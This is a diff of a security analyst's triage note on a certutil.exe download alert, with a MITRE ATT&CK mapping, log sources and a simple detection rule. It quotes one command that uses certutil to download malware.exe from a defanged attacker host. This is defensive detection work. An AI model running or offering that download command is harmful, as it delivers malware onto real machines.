@@ -3,7 +3,7 @@
 # Alert Description
 User Finance_Admin used certutil.exe to download a file from "hxxp://badsite.xyz/malware.exe"
 
-• Example Command:
+- Example Command:
 certutil.exe -urlcache -split -f "hxxp://badsite.xyz/malware.exe"
 
 ## My first Thought 
@@ -14,25 +14,25 @@ certutil.exe is a legitimate Microsoft Windows utility, but attackers often abus
 seeing an Admin using certutil.exe to download from external url is suspicious.
 
 ## MITRE ATT&CK Mapping
-• Tactic:
+- Tactic:
 Command and Control
 ID: TA0011
 
-• Technique:
+- Technique:
 Ingress Tool Transfer
 ID: T1105
 
-• Procedure Example:
+- Procedure Example:
 Certutil.exe (Living-off-the-Land Binary)
 ID: S0160
 
-• Log Sources
+- Log Sources
 - Windows Security Log
  Event ID 4688 – Process Creation
 - Sysmon
  Event ID 1 – Process Creation
 
-• Detection Rule (Simple)
+- Detection Rule (Simple)
 Alert when certutil.exe is executed from a command line or powershell
 
 Analyst should focus on non_Administrative accessing certutil or certutil.exe is accessing the network
